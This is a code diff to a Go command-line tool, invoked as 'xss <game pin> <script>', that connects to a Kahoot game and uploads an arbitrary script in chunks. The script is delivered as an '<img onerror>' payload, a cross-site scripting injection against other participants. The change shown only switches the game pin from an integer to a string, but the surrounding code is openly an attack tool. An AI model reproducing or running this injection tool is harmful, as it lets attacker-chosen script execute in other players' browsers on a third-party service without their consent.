@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"os"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -18,11 +17,7 @@ func main() {
 		fmt.Fprintln(os.Stderr, "Usage: xss <game pin> <script>")
 		os.Exit(1)
 	}
-	gamePin, err := strconv.Atoi(os.Args[1])
-	if err != nil {
-		fmt.Fprintln(os.Stderr, "invalid game pin:", os.Args[1])
-		os.Exit(1)
-	}
+	gamePin := os.Args[1]
 
 	elementText := `<img src="" onerror="` + escapeScript(os.Args[2]) + `">`
 
@@ -34,7 +29,7 @@ func main() {
 	}
 }
 
-func uploadInjectionString(gamePin int, inject string) {
+func uploadInjectionString(gamePin string, inject string) {
 	d1, d2 := computeDelays(1)
 	if err := runShortScript(gamePin, "Z=''", d1, d2); err != nil {
 		fmt.Fprintln(os.Stderr, "Initial script failed:", err)
@@ -49,7 +44,7 @@ func uploadInjectionString(gamePin int, inject string) {
 	}
 }
 
-func uploadNextChunk(gamePin int, chunk string) {
+func uploadNextChunk(gamePin string, chunk string) {
 	// This makes uploading a chunk take logarithmic time instead of linear time. Much faster.
 	var wg sync.WaitGroup
 	d1, d2 := computeDelays(32)
@@ -114,7 +109,7 @@ func escapeScript(script string) string {
 	return script
 }
 
-func runShortScript(gamePin int, script string, delay1, delay2 time.Duration) error {
+func runShortScript(gamePin string, script string, delay1, delay2 time.Duration) error {
 	conn, err := kahoot.NewConn(gamePin)
 	if err != nil {
 		return err
